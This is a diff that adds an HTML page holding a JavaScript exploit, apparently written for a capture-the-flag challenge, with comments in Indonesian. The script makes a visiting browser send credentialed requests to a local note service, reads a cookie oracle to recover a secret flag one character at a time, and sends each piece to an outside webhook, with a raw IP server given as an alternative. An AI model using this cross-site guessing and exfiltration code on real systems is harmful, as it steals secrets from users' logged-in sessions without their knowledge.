@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head><title>E</title></head>
+<body>
+<script>
+const c='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_-!@#$%^&*()+=[]|:;<>,.?/~`';
+let f='SCH{';
+
+// GANTI INI DENGAN WEBHOOK KAMU!
+const WEBHOOK = 'https://webhook.site/d1572cd9-400b-4b8e-9f08-3e788874b3a1';
+// Atau pakai server kamu:
+// const WEBHOOK = 'http://194.31.53.241:8081/log';
+
+async function t(s){
+document.cookie='recentNote=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;';
+await fetch('http://localhost:1337/note',{
+method:'POST',
+headers:{'Content-Type':'application/json'},
+credentials:'include',
+body:JSON.stringify({content:'x',secret:s})
+});
+await new Promise(r=>setTimeout(r,100));
+const m=document.cookie.match(/recentNote=([^;]+)/);
+if(!m)return false;
+const[h]=decodeURIComponent(m[1]).split('|');
+if(!h)return false;
+const d=new TextDecoder().decode(new Uint8Array(h.match(/.{2}/g).map(b=>parseInt(b,16))));
+return d===s;
+}
+
+async function go(){
+// Send start signal
+fetch(WEBHOOK+'?status=START&flag='+f).catch(()=>{});
+
+while(f[f.length-1]!=='}'){
+let found=false;
+for(const ch of c){
+if(await t(f+ch)){
+f+=ch;
+document.body.innerHTML='<h1>'+f+'</h1>';
+console.log('Found:',f);
+// KIRIM FLAG KE WEBHOOK!
+fetch(WEBHOOK+'?flag='+encodeURIComponent(f)).catch(()=>{});
+found=true;
+break;
+}
+await new Promise(r=>setTimeout(r,20));
+}
+if(!found){
+// Send if stopped
+fetch(WEBHOOK+'?status=STOPPED&flag='+encodeURIComponent(f)).catch(()=>{});
+break;
+}
+}
+// Send completion
+fetch(WEBHOOK+'?status=COMPLETE&flag='+encodeURIComponent(f)).catch(()=>{});
+document.body.innerHTML+='<h2>DONE:'+f+'</h2>';
+}
+
+go();
+</script>
+</body>
+</html>
